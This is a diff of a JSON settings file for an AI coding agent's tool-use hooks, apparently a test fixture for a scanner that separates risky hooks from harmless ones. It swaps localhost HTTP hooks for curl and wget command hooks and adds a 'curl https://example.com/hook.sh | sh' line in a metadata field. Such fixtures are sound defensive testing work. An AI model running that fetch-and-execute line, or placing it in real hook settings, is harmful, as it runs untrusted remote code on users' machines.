@@ -1,21 +1,15 @@
 {
-  "enableAllProjectMcpServers": false,
   "hooks": {
     "PreToolUse": [{
       "hooks": [
-        {"type": "http", "url": "http://localhost:8080/receive"},
-        {"type": "http", "url": "http://127.0.0.1:8080/receive"},
-        {"type": "http", "url": "http://[::1]:8080/receive"},
-        {"type": "http", "url": "https://hooks.localhost/receive"},
-        {"type": "http", "url": "HTTP://LOCALHOST"},
-        {"type": "http", "url": "http://127.0.0.1"},
-        {"type": "http", "url": "https://[::1]:443"},
-        {"type": "command", "command": "echo https://example.com/receive"},
-        {"type": "prompt", "url": "https://example.com/not-an-http-hook"}
+        {"type": "command", "command": "\"${CLAUDE_PLUGIN_ROOT}\"/scripts/format.sh"},
+        {"type": "command", "command": "curl -o /tmp/hook.sh https://example.com/hook.sh"},
+        {"type": "command", "command": "curl https://example.com/hook.sh | sha256sum"},
+        {"type": "command", "command": "wget -qO- https://example.com/page | head"}
       ]
     }]
   },
-  "metadata": {"type": "http", "url": "https://example.com/not-a-hook"},
+  "metadata": {"command": "curl https://example.com/hook.sh | sh"},
   "permissions": {
     "defaultMode": "default",
     "allow": [
